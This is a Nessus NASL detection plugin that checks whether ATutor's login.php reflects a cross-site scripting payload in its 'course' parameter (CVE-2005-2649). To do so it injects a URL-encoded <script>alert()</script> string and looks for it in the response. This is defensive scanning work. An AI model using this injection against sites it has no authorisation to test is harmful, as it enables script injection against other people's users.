#
# This script was written by Josh Zlatin-Amishav <josh at ramat doti cc>
#
# This script is released under the GNU GPLv2


if(description)
{
 script_id(19587);
 script_cve_id("CVE-2005-2649");
 script_bugtraq_id(14598);
 if (defined_func("script_xref")) {
   script_xref(name:"OSVDB", value:"18842");
   script_xref(name:"OSVDB", value:"18843");
 }
 script_version ("$Revision: 1.6 $");

 name["english"] = "ATutor Cross Site Scripting Vulnerability";
 script_name(english:name["english"]);

 desc["english"] = "
Synopsis :

The remote web server contains a PHP script which is vulnerable to a 
cross site scripting issue.

Description :

The remote host is running ATutor, a CMS written in PHP.

The remote version of this software is prone to cross-site scripting 
attacks due to its failure to sanitize user-supplied input.

See also : 

http://archives.neohapsis.com/archives/bugtraq/2005-08/0261.html
http://archives.neohapsis.com/archives/fulldisclosure/2005-08/0600.html


Solution :

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 3
(AV:R/AC:H/Au:NR/C:P/A:N/I:N/B:C)";

 script_description(english:desc["english"]);

 summary["english"] = "Checks for XSS in login.php";

 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);

 script_family(english:"CGI abuses : XSS");
 script_copyright(english:"Copyright (C) 2005 Josh Zlatin-Amishav");

 script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("url_func.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);
if ( get_kb_item("www/"+port+"/generic_xss") ) exit(0);

# A simple alert.
xss = "<script>alert(" + SCRIPT_NAME + ")</script>";
# nb: the url-encoded version is what we need to pass in.
exss = urlencode(str:xss);

foreach dir ( cgi_dirs() )
{
 req = http_get(
   item:string(
     dir, "/login.php?",
     'course=">', exss
   ), 
   port:port
 );
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

debug_print("res [", res, "].");

 if (
   egrep(string:res, pattern:"Web site engine's code is copyright .+ href=.http://www\.atutor\.ca") &&
   xss >< res
 )
 {
        	security_note(port);
        	exit(0);
 }
}
